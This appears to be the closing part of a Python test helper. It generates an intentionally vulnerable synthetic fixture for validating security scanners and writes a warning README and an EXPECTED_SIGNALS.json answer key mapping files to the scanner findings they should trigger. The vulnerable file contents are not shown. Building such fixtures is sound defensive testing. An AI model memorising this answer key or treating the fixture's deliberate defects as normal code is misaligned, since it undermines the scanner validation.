def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    a = ap.parse_args()
    root = Path(a.out)
    root.mkdir(parents=True, exist_ok=True)

    (root / "README.md").write_text(
        "# ⚠️ SYNTHETIC SECURITY FIXTURE — INTENTIONALLY VULNERABLE ⚠️\n\n"
        "Generated by `tests/make_fixture.py`. Every defect is deliberate.\n"
        "No real credentials. Never deploy. Never fork. Regenerated per validation run.\n",
        encoding="utf-8")

    manifest = []
    for rel, body, signal, tool in FILES:
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body, encoding="utf-8")
        if signal is not None:
            entry = {"path": rel, "expected_signal": signal}
            if tool:
                # A pin means: this specific scanner must have produced it. Absent = any
                # scanner will do, which is the right default against deliberate overlap.
                entry["tool"] = tool
            manifest.append(entry)

    # Additional expectations attached to files add() already wrote — one seeded file can
    # legitimately prove more than one scanner.
    for rel, signal, tool in EXTRA_SIGNALS:
        assert (root / rel).exists(), f"add_signal references a file that was never created: {rel}"
        entry = {"path": rel, "expected_signal": signal}
        if tool:
            entry["tool"] = tool
        manifest.append(entry)

    (root / "EXPECTED_SIGNALS.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    print(f"fixture written to {root}  ({len(FILES)} files, "
          f"{len({m['expected_signal'] for m in manifest})} distinct expected signals)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
